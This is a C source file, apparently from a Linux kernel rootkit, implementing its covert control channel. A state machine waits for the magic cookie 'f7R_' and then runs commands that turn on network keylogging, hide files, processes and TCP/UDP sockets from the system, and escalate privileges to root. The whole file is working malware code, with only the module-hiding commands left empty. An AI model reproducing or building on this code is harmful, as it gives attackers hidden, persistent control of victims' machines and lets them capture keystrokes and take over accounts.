/*
 * All functionality needed for the covert communication channel.
 */
#include "control.h"
#include "include.h"
#include "privilege_escalation.h"
#include "net_keylog.h"

static int state = 0;
static int cstate = 0;
static char *magic_cookie = "f7R_";

static char command_buffer[32];
static int command_counter = 0;

static char param_buffer[1024];
static int param_counter;

void
execute_command (void)
{
	int port;
	pid_t pid;
	
	
	if(strcmp(command_buffer, "enable_netlog") == 0) {
		if(param_counter > 0) {
			enable_net_keylog(param_buffer);
		}
	}
	else if(strcmp(command_buffer, "disable_netlog") == 0) {
			disable_net_keylog();
		}
	else if(strcmp(command_buffer, "hide_file") == 0) {
		if(param_counter > 0) {
			hide_file_path(param_buffer);
		}
	} else if(strcmp(command_buffer, "unhide_file") == 0) {
		if(param_counter > 0) {
			unhide_file_path(param_buffer);
		}
		
	} else if(strcmp(command_buffer, "hide_process") == 0) {
		if(param_counter > 0) {
			pid = convert_atoi(param_buffer);
			hide_process(pid);	
		}
		
	} else if(strcmp(command_buffer, "unhide_process") == 0) {
		if(param_counter > 0) {
			pid = convert_atoi(param_buffer);
			unhide_process(pid);	
		}
		
	} else if(strcmp(command_buffer, "hide_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			hide_tcp_socket(port);
		}
		
	} else if(strcmp(command_buffer, "unhide_tcp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			unhide_tcp_socket(port);
		}
		
	} else if(strcmp(command_buffer, "hide_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			hide_udp_socket(port);
		}
		
	} else if(strcmp(command_buffer, "unhide_udp") == 0) {
		if(param_counter > 0) {
			port = convert_atoi(param_buffer);
			unhide_udp_socket(port);
		}
		
	} else if(strcmp(command_buffer, "hide_module") == 0) {
		
	} else if(strcmp(command_buffer, "unhide_module") == 0) {
		
	} else if(strcmp(command_buffer, "escalate") == 0) {
		priv_escalation();
		ROOTKIT_DEBUG("rooted\n");
	}

	/* cleanup */
	memset(command_buffer, 0, 32);
	command_counter = 0;
	
	memset(param_buffer, 0 , 1024);
	param_counter = 0;

	state = 0;
}

void
accept_command_input (char input)
{
	if(command_counter >= 0 && command_counter < 32) {

		if(input == ' ') {		/* continue with parameter */
			command_buffer[command_counter] = '\0';
			state = 2;
		} else if(input == ';') {	/* terminate command */
			command_buffer[command_counter] = '\0';
			state = 2;
			execute_command();
		} else {
			command_buffer[command_counter] = input;
			command_counter++;
		}

	} else {
		memset(command_buffer, 0, 32);
		command_counter = 0;

		state = 0;
	} 
}

void accept_param_input (char input)
{
	if(param_counter >= 0 && param_counter < 1024) {
		if(input == ';') {		/* terminate the parameter */
			param_buffer[param_counter] = '\0';
			execute_command();	
		} else if(input == '\'') {	/* useful for aborting input */
			memset(command_buffer, 0, 32);
			command_counter = 0;

			memset(param_buffer, 0, 1024);
			param_counter = 0;

			state = 0;		
		} else {
			param_buffer[param_counter] = input;
			param_counter++;
		}
	} else {
		memset(command_buffer, 0, 32);
		command_counter = 0;
		
		memset(param_buffer, 0, 1024);
		param_counter = 0;

		state = 0;
	}
}

/* the main state-machine accepting our inputs */
void
accept_input (char input)
{
	if(state == 0) {
		
		if(magic_cookie[cstate] == input) {
			cstate++;
		} else {
			cstate = 0;
		}

		if(cstate >= 4) {
			cstate = 0;
			state = 1;
		}

	} else if(state == 1) {
		accept_command_input(input);
	} else if(state == 2) {
		accept_param_input(input);
	}
}
